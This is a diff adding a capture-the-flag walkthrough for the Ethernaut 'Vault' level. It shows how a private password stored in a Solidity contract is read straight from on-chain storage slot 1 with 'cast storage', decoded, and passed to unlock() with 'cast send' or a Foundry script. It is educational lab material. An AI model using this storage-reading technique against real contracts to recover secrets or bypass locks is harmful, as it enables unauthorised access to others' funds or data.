@@ -1,0 +1,64 @@
+"Our objective is to unlock the vault to pass the level, i.e., set the locked to false. Let's dive in. 
+locked
+false
+function unlock(bytes32 _password) public {
+    if (password == _password) {
+        locked = false;
+    }
+}
+
+The unlock() function is taking an input _password and comparing it with an already set password in the constructor. We can not see the password hardcoded anywhere. 
+unlock()
+_password
+The thing about blockchain is all the storage data is publicly visible and anyone can obtain it as we'll be seeing soon. The private variables are not meant to store ""private"" data/passwords. 
+private
+EVM stores data in slots and each slot is 32 bytes in size. The first defined variable is assigned slot 0, the second is assigned slot 1, and so on. This is true if every variable is 32 bytes. Otherwise, slot packing happens to optimize the storage. 
+To finish the level, we need to read the value of the password from slot 1 of the Vault contract and submit it to the unlock() function. 
+password
+unlock()
+To finish this level, we won't even be creating a smart contract. We'll be using cast to fetch the data stored inside private variable slots and make a function call to Ethernaut's deployed instance. 
+cast
+cast storage 0x99eB2673b68505D36bAd14c114B96a9B9e2601fE 1 --rpc-url $RPC_URL
+
+A very strong secret password :)
+cast --to-ascii 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
+
+unlock()
+bytes32
+cast send 0x99eB2673b68505D36bAd14c114B96a9B9e2601fE ""unlock(bytes32)"" ""0x412076657279207374726f6e67207365637265742070617373776f7264203a29"" --private-key $PKEY --rpc-url $RPC_URL
+
+
+This will set the locked variable to false and the instance can be submitted to finish the level. 
+locked
+false
+Since the locked variable is on slot 0, its value can be checked using the following command: 
+locked
+cast storage 0x99eB2673b68505D36bAd14c114B96a9B9e2601fE 0 --rpc-url $RPC_URL
+
+Here's another way to make the function call using forge scripts:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""forge-std/Script.sol"";
+import ""../instances/Ilevel08.sol"";
+
+contract POC is Script {
+
+    Vault level8 = Vault(0x198Bf7b324117Da5EFBCbd58f2B23a387134B8a9);
+
+    function run() external{
+        vm.startBroadcast();
+        console.log(""Vault is :"", level8.locked());
+        level8.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
+        console.log(""Vault is :"", level8.locked());
+        vm.stopBroadcast();
+    }
+}
+
+forge script ./script/level08.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL
+
+
+If you wanted to do the same thing using the console, here's the command to get the storage using Web3:
+await web3.eth.getStorageAt(contracts_address, slot_number)
+
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry"
